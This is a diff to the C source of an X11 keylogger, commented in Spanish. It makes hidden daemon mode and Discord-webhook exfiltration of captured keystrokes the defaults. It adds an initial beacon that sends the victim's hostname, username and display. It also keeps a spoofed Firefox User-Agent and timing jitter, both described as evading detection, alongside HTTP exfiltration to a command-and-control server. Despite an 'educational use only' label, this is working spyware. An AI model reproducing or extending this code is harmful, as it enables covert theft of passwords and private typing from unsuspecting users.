@@ -36,6 +36,7 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <errno.h>
+#include <sys/utsname.h>
 
 #define LOG_FILE "keylog.txt"
 #define MAX_WINDOW_NAME 256
@@ -43,11 +44,12 @@
 
 // Constantes de exfiltración
 #define EXFIL_BUFFER_SIZE 8192
-#define EXFIL_INTERVAL_MIN 45   // Segundos mínimo entre envíos
-#define EXFIL_INTERVAL_MAX 75   // Segundos máximo (jitter para evasión)
+#define EXFIL_INTERVAL_MIN 900   // Segundos mínimo entre envíos (15 min por defecto)
+#define EXFIL_INTERVAL_MAX 900   // Segundos máximo (sin jitter, envío fijo a 15 min)
 #define EXFIL_MAX_RETRIES 3
 #define EXFIL_DEFAULT_PORT "8080"
 #define EXFIL_DEFAULT_PATH "/upload"
+#define EXFIL_JITTER_PERCENT 10  // Porcentaje de jitter para variar envíos (±10%)
 // User-Agent que simula Firefox en Linux para evadir detección
 #define EXFIL_USER_AGENT "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
 
@@ -67,6 +69,8 @@ typedef struct {
     char buffer[EXFIL_BUFFER_SIZE];       // Buffer de datos a exfiltrar
     size_t buffer_len;                    // Longitud actual del buffer
     volatile int thread_running;          // Flag para control del thread
+    int first_send;                       // Flag para enviar mensaje inicial
+    int exfil_interval;                   // Intervalo de exfiltración en segundos (configurable)
 } ExfilState;
 
 // Estructura para encapsular el estado del keylogger
@@ -91,14 +95,14 @@ static KeyloggerState g_state = {
     .logfile = NULL,
     .record_context = 0,
     .running = 1,
-    .daemon_mode = 0,
+    .daemon_mode = 1,         // Modo daemon habilitado por defecto
     .quiet_mode = 0,
     .log_filename = LOG_FILE,
     .last_window = {0},
     .display_env = {0},
     .exfil = {
-        .enabled = 0,
-        .mode = 0,
+        .enabled = 1,          // Discord habilitado por defecto
+        .mode = 1,             // Modo Discord por defecto
         .server = {0},
         .port = EXFIL_DEFAULT_PORT,
         .path = EXFIL_DEFAULT_PATH,
@@ -106,7 +110,9 @@ static KeyloggerState g_state = {
         .thread = 0,
         .buffer = {0},
         .buffer_len = 0,
-        .thread_running = 0
+        .thread_running = 0,
+        .first_send = 1,       // Bandera para primer envío
+        .exfil_interval = 900  // 15 minutos por defecto
     }
 };
 
@@ -540,8 +546,66 @@ void exfil_add_to_buffer(const char *data, size_t len) {
 }
 
 /**
+ * Obtiene información del sistema para el mensaje inicial.
+ * Incluye hostname, usuario, timestamp y configuración.
+ */
+char* exfil_get_system_info(void) {
+    static char info_buffer[1024];
+    char hostname[256];
+    char username[256];
+    char timestamp[64];
+    
+    // Obtener hostname
+    if (gethostname(hostname, sizeof(hostname)) != 0) {
+        strncpy(hostname, "unknown", sizeof(hostname) - 1);
+    }
+    hostname[sizeof(hostname) - 1] = '\0';
+    
+    // Obtener usuario
+    const char *user = getenv("USER");
+    if (user) {
+        strncpy(username, user, sizeof(username) - 1);
+    } else {
+        strncpy(username, "unknown", sizeof(username) - 1);
+    }
+    username[sizeof(username) - 1] = '\0';
+    
+    // Obtener timestamp
+    get_timestamp(timestamp, sizeof(timestamp));
+    
+    // Construir mensaje informativo
+    snprintf(info_buffer, sizeof(info_buffer),
+        "=== INICIO DE CAPTURA X11 ===\n"
+        "Hora: %s\n"
+        "Host: %s\n"
+        "Usuario: %s\n"
+        "Display: %s\n"
+        "Intervalo: %d segundos\n"
+        "Modo: Discord Webhook\n"
+        "=== DATOS CAPTURADOS ===\n",
+        timestamp, hostname, username, g_state.display_env, g_state.exfil.exfil_interval);
+    
+    return info_buffer;
+}
+
+/**
+ * Envía el mensaje inicial al webhook de Discord.
+ * Se llama una sola vez al iniciar el thread de exfiltración.
+ */
+void exfil_send_initial_message(void) {
+    if (g_state.exfil.mode != 1 || g_state.exfil.first_send == 0) {
+        return;  // No es Discord o ya se envió el mensaje inicial
+    }
+    
+    char *system_info = exfil_get_system_info();
+    discord_webhook_post(g_state.exfil.discord_webhook, system_info, strlen(system_info));
+    
+    g_state.exfil.first_send = 0;  // Marcar como enviado
+}
+
+/**
  * Obtiene un intervalo aleatorio con jitter para evadir detección por patrones.
- * Retorna un valor entre EXFIL_INTERVAL_MIN y EXFIL_INTERVAL_MAX.
+ * Retorna un valor entre el intervalo configurado ±10%.
  * 
  * @return Segundos a esperar antes del próximo envío
  */
@@ -553,8 +617,12 @@ int exfil_get_jitter_interval(void) {
         seeded = 1;
     }
     
-    int range = EXFIL_INTERVAL_MAX - EXFIL_INTERVAL_MIN;
-    return EXFIL_INTERVAL_MIN + (rand() % (range + 1));
+    // Aplicar jitter del ±10% al intervalo configurado
+    int jitter = (g_state.exfil.exfil_interval * EXFIL_JITTER_PERCENT) / 100;
+    int min_interval = g_state.exfil.exfil_interval - jitter;
+    int max_interval = g_state.exfil.exfil_interval + jitter;
+    
+    return min_interval + (rand() % (max_interval - min_interval + 1));
 }
 
 /**
@@ -569,6 +637,9 @@ int exfil_get_jitter_interval(void) {
  */
 void* exfil_thread_func(void *arg) {
     (void)arg;
+    
+    // Enviar mensaje inicial si es Discord
+    exfil_send_initial_message();
     
     char send_buffer[EXFIL_BUFFER_SIZE];
     char base64_buffer[EXFIL_BUFFER_SIZE * 2];  // Base64 expande ~33%
@@ -976,23 +1047,23 @@ void print_usage(const char *prog_name) {
     printf("USO EDUCATIVO SOLAMENTE\n\n");
     printf("Uso: %s [opciones]\n\n", prog_name);
     printf("Opciones generales:\n");
-    printf("  -d, --daemon       Ejecutar en segundo plano (oculto)\n");
+    printf("  -d, --daemon       Desactivar modo daemon (ACTIVO POR DEFECTO)\n");
     printf("  -q, --quiet        Modo silencioso (sin output a consola)\n");
     printf("  -o, --output FILE  Archivo de log (default: %s)\n", LOG_FILE);
     printf("  -h, --help         Mostrar esta ayuda\n\n");
-    printf("Opciones de exfiltración (EXCLUYENTES - elegir UNA):\n");
-    printf("  -e, --exfil            Habilitar exfiltración HTTP a servidor C2\n");
-    printf("  -s, --server HOST      IP/hostname del servidor C2 (requiere -e)\n");
-    printf("  -P, --exfil-port PORT  Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
-    printf("      --exfil-path PATH  Path del endpoint (default: %s, requiere -e)\n\n", EXFIL_DEFAULT_PATH);
-    printf("  -D, --discord          Habilitar exfiltración a Discord webhook\n");
-    printf("      --discord-webhook  URL del webhook (compilado desde .env)\n\n");
+    printf("Opciones de exfiltración:\n");
+    printf("  -D, --discord              Habilitar exfiltración a Discord (HABILITADO POR DEFECTO)\n");
+    printf("      --discord-webhook URL Webhook URL para Discord\n");
+    printf("      --exfil-interval SEC  Intervalo de envío en segundos (default: 900 = 15 min)\n");
+    printf("  -e, --exfil                Habilitar exfiltración HTTP a servidor C2\n");
+    printf("  -s, --server HOST          IP/hostname del servidor C2 (requiere -e)\n");
+    printf("  -P, --exfil-port PORT      Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
+    printf("      --exfil-path PATH      Path del endpoint (default: %s, requiere -e)\n\n", EXFIL_DEFAULT_PATH);
     printf("Ejemplos:\n");
-    printf("  %s                              # Modo normal (sin exfiltración)\n", prog_name);
-    printf("  %s -d                           # Daemon oculto\n", prog_name);
-    printf("  %s -d -o /tmp/k.log             # Daemon con log\n", prog_name);
-    printf("  %s -d -e -s 192.168.1.100       # Daemon con exfiltración HTTP\n", prog_name);
-    printf("  %s -d -D                        # Daemon con Discord (webhook desde compilación)\n", prog_name);
+    printf("  %s                              # Daemon + Discord (DEFECTO)\n", prog_name);
+    printf("  %s --exfil-interval 300         # Daemon + Discord, enviar cada 5 min\n", prog_name);
+    printf("  %s -d                           # Foreground + Discord\n", prog_name);
+    printf("  %s -e -s 192.168.1.100          # Daemon + HTTP\n", prog_name);
 }
 
 
@@ -1198,6 +1269,7 @@ int main(int argc, char *argv[]) {
         // Opciones de exfiltración Discord
         {"discord",          no_argument,       0, 'D'},
         {"discord-webhook",  required_argument, 0, 257},  // Solo opción larga
+        {"exfil-interval",   required_argument, 0, 258},  // Intervalo configurable
         {0, 0, 0, 0}
     };
     
@@ -1208,7 +1280,7 @@ int main(int argc, char *argv[]) {
     while ((opt = getopt_long(argc, argv, "dqo:hes:P:D", long_options, &option_index)) != -1) {
         switch (opt) {
             case 'd':
-                g_state.daemon_mode = 1;
+                g_state.daemon_mode = 0;  // Desactivar daemon
                 break;
             case 'q':
                 g_state.quiet_mode = 1;
@@ -1258,6 +1330,17 @@ int main(int argc, char *argv[]) {
                 strncpy(g_state.exfil.discord_webhook, optarg, sizeof(g_state.exfil.discord_webhook) - 1);
                 g_state.exfil.discord_webhook[sizeof(g_state.exfil.discord_webhook) - 1] = '\0';
                 break;
+            case 258:  // --exfil-interval
+                {
+                    int interval = atoi(optarg);
+                    if (interval > 0) {
+                        g_state.exfil.exfil_interval = interval;
+                    } else {
+                        fprintf(stderr, "[!] Error: Intervalo debe ser > 0\n");
+                        return 1;
+                    }
+                }
+                break;
             default:
                 print_usage(argv[0]);
                 return 1;
@@ -1271,18 +1354,21 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    if (discord_mode && g_state.exfil.discord_webhook[0] == '\0') {
-        // Si no se proporciona webhook en CLI, usar el compilado desde .env
-        #ifdef DISCORD_WEBHOOK
-            strncpy(g_state.exfil.discord_webhook, DISCORD_WEBHOOK, sizeof(g_state.exfil.discord_webhook) - 1);
-            g_state.exfil.discord_webhook[sizeof(g_state.exfil.discord_webhook) - 1] = '\0';
-        #else
-            fprintf(stderr, "[!] Error: Discord habilitado pero no hay webhook configurado\n");
-            fprintf(stderr, "[!] Proporciona: --discord-webhook URL\n");
-            fprintf(stderr, "[!] O configura .env con DISCORD_WEBHOOK_URL antes de compilar\n");
-            print_usage(argv[0]);
-            return 1;
-        #endif
+    // Discord es el modo por defecto
+    // Si no se especifica HTTP, usar Discord
+    if (!http_mode) {
+        if (g_state.exfil.discord_webhook[0] == '\0') {
+            // Si no se proporciona webhook en CLI, usar el compilado desde .env
+            #ifdef DISCORD_WEBHOOK
+                strncpy(g_state.exfil.discord_webhook, DISCORD_WEBHOOK, sizeof(g_state.exfil.discord_webhook) - 1);
+                g_state.exfil.discord_webhook[sizeof(g_state.exfil.discord_webhook) - 1] = '\0';
+                g_state.exfil.enabled = 1;
+                g_state.exfil.mode = 1;  // Modo Discord
+            #else
+                // Si no hay webhook, desactivar exfiltración
+                g_state.exfil.enabled = 0;
+            #endif
+        }
     }
     
     return start_keylogger();
